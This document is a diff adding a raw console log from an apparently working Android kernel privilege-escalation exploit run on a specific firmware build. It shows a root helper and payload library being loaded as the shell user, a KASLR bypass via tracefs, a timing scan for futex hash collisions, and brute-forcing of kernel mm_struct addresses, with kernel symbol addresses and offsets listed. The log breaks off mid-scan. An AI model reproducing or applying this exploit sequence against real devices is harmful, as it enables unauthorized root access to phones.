@@ -1,0 +1,304 @@
+[runner-live] following path=/data/local/tmp/run-log.txt interval_ms=100
+[app] root helper=/data/local/tmp/v2root
+[app] loading verified payload=./a37-final.so
+[32m[+] [0mpreload supervisor pid=20572 attempts=1 base_delay=20000 p0_timeout=120 timeout=600
+[32m[+] [0mexploit attempt=1/1 pid=20573 delay=25000 p0_offset=scan
+[32m[+] [0mstartup context pid=20573 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=20573 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=20573 label=a37xv2-A376BXXU1AZB7-app-production-compact stack_writer=pselect reclaim=legacy fops=bank pipe=before-fops
+[32m[+] [0mp0 profile pid=20573 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff80016b43e8 bootid_data=ffffff80023edf38 init_task=ffffff80022af700 root_tg=ffffff80024c3d40 sysctl_bootid=ffffff800267af58
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=106
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=0 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc00826495c event=106 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc001f6d8dc event=106 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc001f6d8dc event=106 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc001f6d8dc event=106 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081dba84 event=106 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081dba84 event=106 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc001f6d8dc event=106 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081dba84 event=106 len=32
+[33m[*] [0mslide tracefs candidate=00100000 hits=181
+[33m[*] [0mslide tracefs raw summary pages=8 bytes=32768 events=351 callers=349 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00100000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=20573 base=ffffffc008100000 slide=0000000000100000 data_mode=canonical
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (8) mte disabled
+[31m[-] [0mSELFTEST SUMMARY bad=0/300
+[31m[-] [0mHASH-DIAG-RAW key[0] raw=0000000c bucket128=12 bucket2048=12 bits7_10=0
+[31m[-] [0mHASH-DIAG-RAW key[1] raw=00000846 bucket128=70 bucket2048=70 bits7_10=0
+[31m[-] [0mHASH-DIAG-RAW key[2] raw=0000006a bucket128=106 bucket2048=106 bits7_10=0
+[31m[-] [0mHASH-DIAG-RAW key[3] raw=00000876 bucket128=118 bucket2048=118 bits7_10=0
+[31m[-] [0mHASH-DIAG-RAW key[4] raw=00000833 bucket128=51 bucket2048=51 bits7_10=0
+[31m[-] [0mHASH-DIAG-RAW key[5] raw=00000844 bucket128=68 bucket2048=68 bits7_10=0
+[31m[-] [0mHASH-DIAG-RAW key[6] raw=0000004b bucket128=75 bucket2048=75 bits7_10=0
+[31m[-] [0mHASH-DIAG-RAW key[7] raw=00000829 bucket128=41 bucket2048=41 bits7_10=0
+[31m[-] [0mHASH-DIAG-RAW key[8] raw=0000005d bucket128=93 bucket2048=93 bits7_10=0
+[31m[-] [0mHASH-DIAG-RAW key[9] raw=0000001c bucket128=28 bucket2048=28 bits7_10=0
+[33m[*] [0mbefore increase
+[33m[*] [0mafter increase, start finding collisisons
+[33m[*] [0mtarget    0000007de2f860e0
+[33m[*] [0mscan progress 10000/131072 t=17
+[33m[*] [0mscan progress 20000/131072 t=19
+[33m[*] [0mscan progress 30000/131072 t=17
+[33m[*] [0mscan progress 40000/131072 t=19
+[33m[*] [0mscan progress 50000/131072 t=19
+[33m[*] [0mscan progress 60000/131072 t=18
+[33m[*] [0mscan progress 70000/131072 t=19
+[33m[*] [0mscan progress 80000/131072 t=19
+[33m[*] [0mscan progress 90000/131072 t=19
+[33m[*] [0mscan progress 100000/131072 t=17
+[33m[*] [0mscan progress 110000/131072 t=19
+[33m[*] [0mscan progress 120000/131072 t=19
+[33m[*] [0mscan progress 130000/131072 t=19
+[33m[*] [0m  0000006b07fa16b0 t=19597
+[33m[*] [0m  0000006aee11a278 t=19441
+[33m[*] [0m  0000006b0cd212b0 t=19171
+[33m[*] [0m  0000006aee6d3040 t=18316
+[33m[*] [0m  0000006aef1b7760 t=16132
+[33m[*] [0m  0000006afd5a56d0 t=15425
+[33m[*] [0m  0000006afdfd3840 t=15425
+[33m[*] [0mfound 7 collisisons
+[33m[*] [0mHASH-DIAG: target_bucket=128 target_addr=0000007de2f860e0
+[33m[*] [0mHASH-DIAG: cand[0]=0000006b07fa16b0 time=19597
+[33m[*] [0mHASH-DIAG: cand[1]=0000006aee11a278 time=19441
+[33m[*] [0mHASH-DIAG: cand[2]=0000006b0cd212b0 time=19171
+[33m[*] [0mHASH-DIAG: cand[3]=0000006aee6d3040 time=18316
+[33m[*] [0mHASH-DIAG: cand[4]=0000006aef1b7760 time=16132
+[33m[*] [0mHASH-DIAG: cand[5]=0000006afd5a56d0 time=15425
+[33m[*] [0mHASH-DIAG: cand[6]=0000006afdfd3840 time=15425
+[31m[-] [0mKSDIAG approx=17 thr=170 min=16 max=19597 mean=23 n=131070
+[33m[*] [0mstart bruteforcing
+[33m[*] [0midentity_diff=39c00000 slide=100000
+[33m[*] [0mmm_struct_sz=3c0 mm_slab_order=3 mm_slab_sz=8000
+[33m[*] [0mfutex_addrs[0]=0000007de2f860e0
+[33m[*] [0mfutex_addrs[1]=0000006b07fa16b0
+[33m[*] [0mfutex_addrs[2]=0000006aee11a278
+[33m[*] [0mfutex_addrs[3]=0000006b0cd212b0
+[33m[*] [0mfutex_addrs[4]=0000006aee6d3040
+[33m[*] [0mfutex_addrs[5]=0000006aef1b7760
+[33m[*] [0mfutex_addrs[6]=0000006afd5a56d0
+[33m[*] [0mfutex_addrs[7]=0000006afdfd3840
+[33m[*] [0mDIAG sample: mm=ffffff8000100000 futex0=0000007de2f860e0 futex1=0000006b07fa16b0 h0=18 h1=111 eq=0
+[33m[*] [0mDIAG selftest: zero_key hash=12
+[33m[*] [0mDIAG selftest: kern_ref=12 user=12 match=1
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0mDIAG[0] cand=ffffff8000000000 h0=64 b0=64 h1=107 b1=107 h2=119 h3=5 nmatch=0
+[33m[*] [0mDIAG[1] cand=ffffff80000003c0 h0=113 b0=113 h1=94 b1=94 h2=19 h3=109 nmatch=0
+[33m[*] [0mDIAG[2] cand=ffffff8000000780 h0=6 b0=6 h1=13 b1=13 h2=49 h3=57 nmatch=0
+[33m[*] [0mDIAG[3] cand=ffffff8000000b40 h0=22 b0=22 h1=114 b1=114 h2=66 h3=46 nmatch=0
+[33m[*] [0mDIAG[4] cand=ffffff8000000f00 h0=24 b0=24 h1=99 b1=99 h2=120 h3=125 nmatch=0
+[33m[*] [0mDIAG[5] cand=ffffff80000012c0 h0=75 b0=75 h1=82 b1=82 h2=10 h3=72 nmatch=0
+[33m[*] [0mDIAG[6] cand=ffffff8000001680 h0=85 b0=85 h1=77 b1=77 h2=77 h3=10 nmatch=0
+[33m[*] [0mDIAG[7] cand=ffffff8000001a40 h0=82 b0=82 h1=0 b1=0 h2=121 h3=88 nmatch=1
+[33m[*] [0mDIAG[8] cand=ffffff8000001e00 h0=61 b0=61 h1=110 b1=110 h2=38 h3=27 nmatch=0
+[33m[*] [0mDIAG[9] cand=ffffff80000021c0 h0=45 b0=45 h1=104 b1=104 h2=9 h3=48 nmatch=0
+[33m[*] [0mDIAG[10] cand=ffffff8000002580 h0=71 b0=71 h1=76 b1=76 h2=123 h3=50 nmatch=0
+[33m[*] [0mDIAG[11] cand=ffffff8000002940 h0=76 b0=76 h1=37 b1=37 h2=66 h3=108 nmatch=0
+[33m[*] [0mDIAG[12] cand=ffffff8000002d00 h0=22 b0=22 h1=63 b1=63 h2=64 h3=22 nmatch=1
+[33m[*] [0mDIAG[13] cand=ffffff80000030c0 h0=106 b0=106 h1=35 b1=35 h2=37 h3=95 nmatch=0
+[33m[*] [0mDIAG[14] cand=ffffff8000003480 h0=117 b0=117 h1=61 b1=61 h2=0 h3=56 nmatch=0
+[33m[*] [0mDIAG[15] cand=ffffff8000003840 h0=101 b0=101 h1=85 b1=85 h2=41 h3=17 nmatch=0
+[33m[*] [0mDIAG[16] cand=ffffff8000003c00 h0=82 b0=82 h1=37 b1=37 h2=123 h3=70 nmatch=0
+[33m[*] [0mDIAG[17] cand=ffffff8000003fc0 h0=10 b0=10 h1=53 b1=53 h2=3 h3=16 nmatch=0
+[33m[*] [0mDIAG[18] cand=ffffff8000004380 h0=18 b0=18 h1=75 b1=75 h2=43 h3=45 nmatch=0
+[33m[*] [0mDIAG[19] cand=ffffff8000004740 h0=80 b0=80 h1=21 b1=21 h2=30 h3=121 nmatch=0
+[33m[*] [0mDIAG[20] cand=ffffff8000004b00 h0=73 b0=73 h1=28 b1=28 h2=34 h3=55 nmatch=0
+[33m[*] [0mDIAG[21] cand=ffffff8000004ec0 h0=14 b0=14 h1=41 b1=41 h2=125 h3=60 nmatch=0
+[33m[*] [0mDIAG[22] cand=ffffff8000005280 h0=64 b0=64 h1=76 b1=76 h2=78 h3=34 nmatch=0
+[33m[*] [0mDIAG[23] cand=ffffff8000005640 h0=108 b0=108 h1=42 b1=42 h2=102 h3=93 nmatch=1
+[33m[*] [0mDIAG[24] cand=ffffff8000005a00 h0=42 b0=42 h1=23 b1=23 h2=44 h3=0 nmatch=0
+[33m[*] [0mDIAG[25] cand=ffffff8000005dc0 h0=51 b0=51 h1=34 b1=34 h2=56 h3=111 nmatch=0
+[33m[*] [0mDIAG[26] cand=ffffff8000006180 h0=122 b0=122 h1=79 b1=79 h2=70 h3=111 nmatch=0
+[33m[*] [0mDIAG[27] cand=ffffff8000006540 h0=80 b0=80 h1=20 b1=20 h2=98 h3=41 nmatch=0
+[33m[*] [0mDIAG[28] cand=ffffff8000006900 h0=81 b0=81 h1=82 b1=82 h2=32 h3=40 nmatch=0
+[33m[*] [0mDIAG[29] cand=ffffff8000006cc0 h0=93 b0=93 h1=87 b1=87 h2=101 h3=73 nmatch=0
+[33m[*] [0mDIAG[30] cand=ffffff8000007080 h0=56 b0=56 h1=36 b1=36 h2=19 h3=14 nmatch=0
+[33m[*] [0mDIAG[31] cand=ffffff8000007440 h0=72 b0=72 h1=115 b1=115 h2=47 h3=90 nmatch=0
+[33m[*] [0mDIAG[32] cand=ffffff8000007800 h0=11 b0=11 h1=80 b1=80 h2=87 h3=79 nmatch=0
+[33m[*] [0mDIAG[33] cand=ffffff8000007bc0 h0=7 b0=7 h1=13 b1=13 h2=84 h3=9 nmatch=0
+[33m[*] [0mDIAG[34] cand=ffffff8000007f80 h0=99 b0=99 h1=62 b1=62 h2=52 h3=21 nmatch=0
+[33m[*] [0mDIAG[35] cand=ffffff8000008000 h0=121 b0=121 h1=120 b1=120 h2=126 h3=101 nmatch=0
+[33m[*] [0mDIAG[36] cand=ffffff80000083c0 h0=36 b0=36 h1=32 b1=32 h2=48 h3=111 nmatch=0
+[33m[*] [0mDIAG[37] cand=ffffff8000008780 h0=37 b0=37 h1=41 b1=41 h2=6 h3=46 nmatch=0
+[33m[*] [0mDIAG[38] cand=ffffff8000008b40 h0=4 b0=4 h1=44 b1=44 h2=39 h3=88 nmatch=0
+[33m[*] [0mDIAG[39] cand=ffffff8000008f00 h0=57 b0=57 h1=11 b1=11 h2=113 h3=91 nmatch=0
+[33m[*] [0mDIAG[40] cand=ffffff80000092c0 h0=107 b0=107 h1=89 b1=89 h2=49 h3=88 nmatch=0
+[33m[*] [0mDIAG[41] cand=ffffff8000009680 h0=108 b0=108 h1=124 b1=124 h2=31 h3=119 nmatch=0
+[33m[*] [0mDIAG[42] cand=ffffff8000009a40 h0=82 b0=82 h1=37 b1=37 h2=52 h3=60 nmatch=0
+[33m[*] [0mDIAG[43] cand=ffffff8000009e00 h0=55 b0=55 h1=57 b1=57 h2=127 h3=41 nmatch=0
+[33m[*] [0mDIAG[44] cand=ffffff800000a1c0 h0=118 b0=118 h1=48 b1=48 h2=104 h3=113 nmatch=0
+[33m[*] [0mDIAG[45] cand=ffffff800000a580 h0=44 b0=44 h1=122 b1=122 h2=95 h3=46 nmatch=0
+[33m[*] [0mDIAG[46] cand=ffffff800000a940 h0=105 b0=105 h1=113 b1=113 h2=41 h3=2 nmatch=0
+[33m[*] [0mDIAG[47] cand=ffffff800000ad00 h0=61 b0=61 h1=32 b1=32 h2=111 h3=19 nmatch=0
+[33m[*] [0mDIAG[48] cand=ffffff800000b0c0 h0=7 b0=7 h1=103 b1=103 h2=66 h3=15 nmatch=0
+[33m[*] [0mDIAG[49] cand=ffffff800000b480 h0=32 b0=32 h1=72 b1=72 h2=84 h3=62 nmatch=0
+[33m[*] [0mDIAG[50] cand=ffffff800000b840 h0=6 b0=6 h1=120 b1=120 h2=111 h3=9 nmatch=0
+[33m[*] [0mDIAG[51] cand=ffffff800000bc00 h0=42 b0=42 h1=62 b1=62 h2=62 h3=17 nmatch=0
+[33m[*] [0mDIAG[52] cand=ffffff800000bfc0 h0=27 b0=27 h1=20 b1=20 h2=70 h3=43 nmatch=0
+[33m[*] [0mDIAG[53] cand=ffffff800000c380 h0=90 b0=90 h1=127 b1=127 h2=86 h3=107 nmatch=0
+[33m[*] [0mDIAG[54] cand=ffffff800000c740 h0=106 b0=106 h1=71 b1=71 h2=6 h3=21 nmatch=0
+[33m[*] [0mDIAG[55] cand=ffffff800000cb00 h0=40 b0=40 h1=79 b1=79 h2=58 h3=10 nmatch=0
+[33m[*] [0mDIAG[56] cand=ffffff800000cec0 h0=5 b0=5 h1=59 b1=59 h2=71 h3=94 nmatch=0
+[33m[*] [0mDIAG[57] cand=ffffff800000d280 h0=40 b0=40 h1=62 b1=62 h2=118 h3=123 nmatch=0
+[33m[*] [0mDIAG[58] cand=ffffff800000d640 h0=8 b0=8 h1=116 b1=116 h2=98 h3=111 nmatch=0
+[33m[*] [0mDIAG[59] cand=ffffff800000da00 h0=77 b0=77 h1=63 b1=63 h2=78 h3=3 nmatch=0
+[33m[*] [0mDIAG[60] cand=ffffff800000ddc0 h0=124 b0=124 h1=127 b1=127 h2=122 h3=103 nmatch=0
+[33m[*] [0mDIAG[61] cand=ffffff800000e180 h0=87 b0=87 h1=20 b1=20 h2=115 h3=110 nmatch=0
+[33m[*] [0mDIAG[62] cand=ffffff800000e540 h0=55 b0=55 h1=88 b1=88 h2=25 h3=80 nmatch=0
+[33m[*] [0mDIAG[63] cand=ffffff800000e900 h0=113 b0=113 h1=17 b1=17 h2=7 h3=5 nmatch=0
+[33m[*] [0mDIAG[64] cand=ffffff800000ecc0 h0=43 b0=43 h1=95 b1=95 h2=115 h3=82 nmatch=0
+[33m[*] [0mDIAG[65] cand=ffffff800000f080 h0=17 b0=17 h1=120 b1=120 h2=75 h3=14 nmatch=0
+[33m[*] [0mDIAG[66] cand=ffffff800000f440 h0=72 b0=72 h1=81 b1=81 h2=81 h3=55 nmatch=0
+[33m[*] [0mDIAG[67] cand=ffffff800000f800 h0=123 b0=123 h1=53 b1=53 h2=69 h3=34 nmatch=0
+[33m[*] [0mDIAG[68] cand=ffffff800000fbc0 h0=59 b0=59 h1=18 b1=18 h2=5 h3=70 nmatch=0
+[33m[*] [0mDIAG[69] cand=ffffff800000ff80 h0=27 b0=27 h1=8 b1=8 h2=40 h3=75 nmatch=0
+[33m[*] [0mDIAG[70] cand=ffffff8000010000 h0=37 b0=37 h1=60 b1=60 h2=39 h3=22 nmatch=0
+[33m[*] [0mDIAG[71] cand=ffffff80000103c0 h0=50 b0=50 h1=11 b1=11 h2=5 h3=127 nmatch=0
+[33m[*] [0mDIAG[72] cand=ffffff8000010780 h0=26 b0=26 h1=15 b1=15 h2=109 h3=22 nmatch=0
+[33m[*] [0mDIAG[73] cand=ffffff8000010b40 h0=93 b0=93 h1=2 b1=2 h2=43 h3=13 nmatch=0
+[33m[*] [0mDIAG[74] cand=ffffff8000010f00 h0=124 b0=124 h1=25 b1=25 h2=37 h3=110 nmatch=0
+[33m[*] [0mDIAG[75] cand=ffffff80000112c0 h0=18 b0=18 h1=9 b1=9 h2=100 h3=8 nmatch=0
+[33m[*] [0mDIAG[76] cand=ffffff8000011680 h0=88 b0=88 h1=60 b1=60 h2=11 h3=118 nmatch=0
+[33m[*] [0mDIAG[77] cand=ffffff8000011a40 h0=105 b0=105 h1=32 b1=32 h2=41 h3=85 nmatch=0
+[33m[*] [0mDIAG[78] cand=ffffff8000011e00 h0=10 b0=10 h1=124 b1=124 h2=44 h3=50 nmatch=0
+[33m[*] [0mDIAG[79] cand=ffffff80000121c0 h0=85 b0=85 h1=119 b1=119 h2=59 h3=48 nmatch=0
+[33m[*] [0mDIAG[80] cand=ffffff8000012580 h0=94 b0=94 h1=65 b1=65 h2=4 h3=58 nmatch=0
+[33m[*] [0mDIAG[81] cand=ffffff8000012940 h0=68 b0=68 h1=123 b1=123 h2=78 h3=36 nmatch=0
+[33m[*] [0mDIAG[82] cand=ffffff8000012d00 h0=122 b0=122 h1=49 b1=49 h2=11 h3=99 nmatch=0
+[33m[*] [0mDIAG[83] cand=ffffff80000130c0 h0=19 b0=19 h1=73 b1=73 h2=73 h3=1 nmatch=0
+[33m[*] [0mDIAG[84] cand=ffffff8000013480 h0=59 b0=59 h1=103 b1=103 h2=111 h3=23 nmatch=0
+[33m[*] [0mDIAG[85] cand=ffffff8000013840 h0=94 b0=94 h1=58 b1=58 h2=24 h3=68 nmatch=0
+[33m[*] [0mDIAG[86] cand=ffffff8000013c00 h0=122 b0=122 h1=0 b1=0 h2=109 h3=69 nmatch=0
+[33m[*] [0mDIAG[87] cand=ffffff8000013fc0 h0=89 b0=89 h1=52 b1=52 h2=114 h3=118 nmatch=0
+[33m[*] [0mDIAG[88] cand=ffffff8000014380 h0=74 b0=74 h1=3 b1=3 h2=46 h3=58 nmatch=0
+[33m[*] [0mDIAG[89] cand=ffffff8000014740 h0=102 b0=102 h1=107 b1=107 h2=30 h3=15 nmatch=1
+[33m[*] [0mDIAG[90] cand=ffffff8000014b00 h0=97 b0=97 h1=115 b1=115 h2=77 h3=116 nmatch=0
+[33m[*] [0mDIAG[91] cand=ffffff8000014ec0 h0=115 b0=115 h1=37 b1=37 h2=8 h3=75 nmatch=0
+[33m[*] [0m[  1] start finding mm_struct [ffffff8000000000-ffffff8080000000]
+[33m[*] [0mDIAG[92] cand=ffffff8000000000 h0=64 b0=64 h1=107 b1=107 h2=119 h3=5 nmatch=0
+[33m[*] [0mDIAG[93] cand=ffffff80000003c0 h0=113 b0=113 h1=94 b1=94 h2=19 h3=109 nmatch=0
+[33m[*] [0mDIAG[94] cand=ffffff8000000780 h0=6 b0=6 h1=13 b1=13 h2=49 h3=57 nmatch=0
+[33m[*] [0mDIAG[95] cand=ffffff8000000b40 h0=22 b0=22 h1=114 b1=114 h2=66 h3=46 nmatch=0
+[33m[*] [0m[  2] start finding mm_struct [ffffff8040000000-ffffff80c0000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff80c0000000-ffffff8140000000]
+[33m[*] [0mDIAG[96] cand=ffffff80c0000000 h0=16 b0=16 h1=38 b1=38 h2=83 h3=76 nmatch=0
+[33m[*] [0mDIAG[97] cand=ffffff80c00003c0 h0=43 b0=43 h1=114 b1=114 h2=28 h3=94 nmatch=0
+[33m[*] [0mDIAG[98] cand=ffffff80c0000780 h0=73 b0=73 h1=122 b1=122 h2=121 h3=48 nmatch=0
+[33m[*] [0mDIAG[99] cand=ffffff80c0000b40 h0=33 b0=33 h1=41 b1=41 h2=43 h3=28 nmatch=0
+[33m[*] [0mDIAG[100] cand=ffffff80c0000f00 h0=31 b0=31 h1=107 b1=107 h2=121 h3=3 nmatch=0
+[33m[*] [0mDIAG[101] cand=ffffff80c00012c0 h0=107 b0=107 h1=54 b1=54 h2=45 h3=79 nmatch=0
+[33m[*] [0mDIAG[102] cand=ffffff80c0001680 h0=14 b0=14 h1=63 b1=63 h2=111 h3=116 nmatch=0
+[33m[*] [0mDIAG[103] cand=ffffff80c0001a40 h0=94 b0=94 h1=124 b1=124 h2=12 h3=54 nmatch=0
+[33m[*] [0mDIAG[104] cand=ffffff80c0001e00 h0=125 b0=125 h1=50 b1=50 h2=69 h3=105 nmatch=0
+[33m[*] [0mDIAG[105] cand=ffffff80c00021c0 h0=65 b0=65 h1=11 b1=11 h2=87 h3=127 nmatch=0
+[33m[*] [0mDIAG[106] cand=ffffff80c0002580 h0=127 b0=127 h1=59 b1=59 h2=42 h3=26 nmatch=0
+[33m[*] [0mDIAG[107] cand=ffffff80c0002940 h0=14 b0=14 h1=14 b1=14 h2=0 h3=72 nmatch=1
+[33m[*] [0mDIAG[108] cand=ffffff80c0002d00 h0=97 b0=97 h1=12 b1=12 h2=44 h3=111 nmatch=0
+[33m[*] [0mDIAG[109] cand=ffffff80c00030c0 h0=44 b0=44 h1=110 b1=110 h2=64 h3=123 nmatch=0
+[33m[*] [0mDIAG[110] cand=ffffff80c0003480 h0=55 b0=55 h1=106 b1=106 h2=87 h3=26 nmatch=0
+[33m[*] [0mDIAG[111] cand=ffffff80c0003840 h0=74 b0=74 h1=99 b1=99 h2=32 h3=66 nmatch=0
+[33m[*] [0mDIAG[112] cand=ffffff80c0003c00 h0=24 b0=24 h1=15 b1=15 h2=117 h3=38 nmatch=0
+[33m[*] [0mDIAG[113] cand=ffffff80c0003fc0 h0=127 b0=127 h1=51 b1=51 h2=122 h3=66 nmatch=0
+[33m[*] [0mDIAG[114] cand=ffffff80c0004380 h0=118 b0=118 h1=85 b1=85 h2=50 h3=80 nmatch=0
+[33m[*] [0mDIAG[115] cand=ffffff80c0004740 h0=88 b0=88 h1=16 b1=16 h2=100 h3=93 nmatch=0
+[33m[*] [0mDIAG[116] cand=ffffff80c0004b00 h0=89 b0=89 h1=37 b1=37 h2=12 h3=72 nmatch=0
+[33m[*] [0mDIAG[117] cand=ffffff80c0004ec0 h0=67 b0=67 h1=65 b1=65 h2=42 h3=51 nmatch=0
+[33m[*] [0mDIAG[118] cand=ffffff80c0005280 h0=26 b0=26 h1=98 b1=98 h2=114 h3=14 nmatch=0
+[33m[*] [0mDIAG[119] cand=ffffff80c0005640 h0=31 b0=31 h1=49 b1=49 h2=52 h3=78 nmatch=0
+[33m[*] [0mDIAG[120] cand=ffffff80c0005a00 h0=57 b0=57 h1=120 b1=120 h2=113 h3=95 nmatch=0
+[33m[*] [0mDIAG[121] cand=ffffff80c0005dc0 h0=73 b0=73 h1=100 b1=100 h2=113 h3=117 nmatch=0
+[33m[*] [0mDIAG[122] cand=ffffff80c0006180 h0=22 b0=22 h1=63 b1=63 h2=8 h3=85 nmatch=0
+[33m[*] [0mDIAG[123] cand=ffffff80c0006540 h0=61 b0=61 h1=103 b1=103 h2=11 h3=62 nmatch=0
+[33m[*] [0mDIAG[124] cand=ffffff80c0006900 h0=34 b0=34 h1=1 b1=1 h2=46 h3=36 nmatch=0
+[33m[*] [0mDIAG[125] cand=ffffff80c0006cc0 h0=5 b0=5 h1=77 b1=77 h2=67 h3=50 nmatch=0
+[33m[*] [0mDIAG[126] cand=ffffff80c0007080 h0=70 b0=70 h1=110 b1=110 h2=38 h3=112 nmatch=0
+[33m[*] [0mDIAG[127] cand=ffffff80c0007440 h0=24 b0=24 h1=108 b1=108 h2=52 h3=92 nmatch=0
+[33m[*] [0mDIAG[128] cand=ffffff80c0007800 h0=4 b0=4 h1=27 b1=27 h2=64 h3=79 nmatch=0
+[33m[*] [0mDIAG[129] cand=ffffff80c0007bc0 h0=33 b0=33 h1=51 b1=51 h2=12 h3=101 nmatch=0
+[33m[*] [0mDIAG[130] cand=ffffff80c0007f80 h0=62 b0=62 h1=88 b1=88 h2=107 h3=105 nmatch=0
+[33m[*] [0mDIAG[131] cand=ffffff80c0008000 h0=27 b0=27 h1=83 b1=83 h2=60 h3=3 nmatch=0
+[33m[*] [0mDIAG[132] cand=ffffff80c00083c0 h0=117 b0=117 h1=98 b1=98 h2=22 h3=77 nmatch=0
+[33m[*] [0mDIAG[133] cand=ffffff80c0008780 h0=112 b0=112 h1=21 b1=21 h2=86 h3=63 nmatch=0
+[33m[*] [0mDIAG[134] cand=ffffff80c0008b40 h0=32 b0=32 h1=63 b1=63 h2=8 h3=65 nmatch=0
+[33m[*] [0mDIAG[135] cand=ffffff80c0008f00 h0=123 b0=123 h1=1 b1=1 h2=85 h3=30 nmatch=0
+[33m[*] [0mDIAG[136] cand=ffffff80c00092c0 h0=9 b0=9 h1=77 b1=77 h2=77 h3=31 nmatch=0
+[33m[*] [0mDIAG[137] cand=ffffff80c0009680 h0=68 b0=68 h1=2 b1=2 h2=61 h3=93 nmatch=0
+[33m[*] [0mDIAG[138] cand=ffffff80c0009a40 h0=27 b0=27 h1=119 b1=119 h2=110 h3=40 nmatch=0
+[33m[*] [0mDIAG[139] cand=ffffff80c0009e00 h0=126 b0=126 h1=59 b1=59 h2=32 h3=117 nmatch=1
+[33m[*] [0mDIAG[140] cand=ffffff80c000a1c0 h0=31 b0=31 h1=114 b1=114 h2=14 h3=15 nmatch=0
+[33m[*] [0mDIAG[141] cand=ffffff80c000a580 h0=20 b0=20 h1=123 b1=123 h2=70 h3=64 nmatch=0
+[33m[*] [0m[  7] start finding mm_struct [ffffff8180000000-ffffff8200000000]
+[33m[*] [0mDIAG[142] cand=ffffff8180000000 h0=84 b0=84 h1=36 b1=36 h2=121 h3=11 nmatch=0
+[33m[*] [0mDIAG[143] cand=ffffff81800003c0 h0=94 b0=94 h1=105 b1=105 h2=66 h3=39 nmatch=0
+[33m[*] [0m[  3] start finding mm_struct [ffffff8080000000-ffffff8100000000]
+[33m[*] [0mDIAG[144] cand=ffffff8080000000 h0=38 b0=38 h1=118 b1=118 h2=114 h3=119 nmatch=0
+[33m[*] [0mDIAG[145] cand=ffffff80800003c0 h0=48 b0=48 h1=103 b1=103 h2=78 h3=6 nmatch=0
+[33m[*] [0mDIAG[146] cand=ffffff8080000780 h0=99 b0=99 h1=23 b1=23 h2=37 h3=84 nmatch=0
+[33m[*] [0mDIAG[147] cand=ffffff8080000b40 h0=30 b0=30 h1=90 b1=90 h2=113 h3=21 nmatch=0
+[33m[*] [0mDIAG[148] cand=ffffff8080000f00 h0=12 b0=12 h1=64 b1=64 h2=100 h3=87 nmatch=0
+[33m[*] [0mDIAG[149] cand=ffffff80800012c0 h0=20 b0=20 h1=50 b1=50 h2=52 h3=25 nmatch=0
+[33m[*] [0mDIAG[150] cand=ffffff8080001680 h0=4 b0=4 h1=9 b1=9 h2=119 h3=94 nmatch=0
+[33m[*] [0mDIAG[151] cand=ffffff8080001a40 h0=22 b0=22 h1=94 b1=94 h2=83 h3=29 nmatch=1
+[33m[*] [0mDIAG[152] cand=ffffff8080001e00 h0=116 b0=116 h1=83 b1=83 h2=74 h3=71 nmatch=0
+[33m[*] [0mDIAG[153] cand=ffffff80800021c0 h0=78 b0=78 h1=88 b1=88 h2=105 h3=32 nmatch=0
+[33m[*] [0mDIAG[154] cand=ffffff8080002580 h0=63 b0=63 h1=106 b1=106 h2=57 h3=19 nmatch=0
+[33m[*] [0mDIAG[155] cand=ffffff8080002940 h0=42 b0=42 h1=47 b1=47 h2=66 h3=81 nmatch=0
+[33m[*] [0mDIAG[156] cand=ffffff8080002d00 h0=33 b0=33 h1=89 b1=89 h2=29 h3=20 nmatch=0
+[33m[*] [0mDIAG[157] cand=ffffff80800030c0 h0=85 b0=85 h1=27 b1=27 h2=40 h3=24 nmatch=1
+[33m[*] [0mDIAG[158] cand=ffffff8080003480 h0=55 b0=55 h1=27 b1=27 h2=111 h3=30 nmatch=0
+[33m[*] [0mDIAG[159] cand=ffffff8080003840 h0=16 b0=16 h1=100 b1=100 h2=67 h3=47 nmatch=0
+[33m[*] [0mDIAG[160] cand=ffffff8080003c00 h0=87 b0=87 h1=73 b1=73 h2=122 h3=34 nmatch=0
+[33m[*] [0mDIAG[161] cand=ffffff8080003fc0 h0=1 b0=1 h1=64 b1=64 h2=108 h3=80 nmatch=0
+[33m[*] [0mDIAG[162] cand=ffffff8080004380 h0=108 b0=108 h1=7 b1=7 h2=32 h3=30 nmatch=0
+[33m[*] [0mDIAG[163] cand=ffffff8080004740 h0=10 b0=10 h1=46 b1=46 h2=17 h3=92 nmatch=0
+[33m[*] [0mDIAG[164] cand=ffffff8080004b00 h0=118 b0=118 h1=33 b1=33 h2=126 h3=68 nmatch=0
+[33m[*] [0mDIAG[165] cand=ffffff8080004ec0 h0=110 b0=110 h1=105 b1=105 h2=113 h3=101 nmatch=0
+[33m[*] [0mDIAG[166] cand=ffffff8080005280 h0=59 b0=59 h1=9 b1=9 h2=8 h3=54 nmatch=0
+[33m[*] [0mDIAG[167] cand=ffffff8080005640 h0=110 b0=110 h1=36 b1=36 h2=106 h3=57 nmatch=0
+[33m[*] [0mDIAG[168] cand=ffffff8080005a00 h0=27 b0=27 h1=2 b1=2 h2=23 h3=15 nmatch=0
+[33m[*] [0mDIAG[169] cand=ffffff8080005dc0 h0=108 b0=108 h1=14 b1=14 h2=74 h3=87 nmatch=0
+[33m[*] [0mDIAG[170] cand=ffffff8080006180 h0=73 b0=73 h1=79 b1=79 h2=66 h3=73 nmatch=1
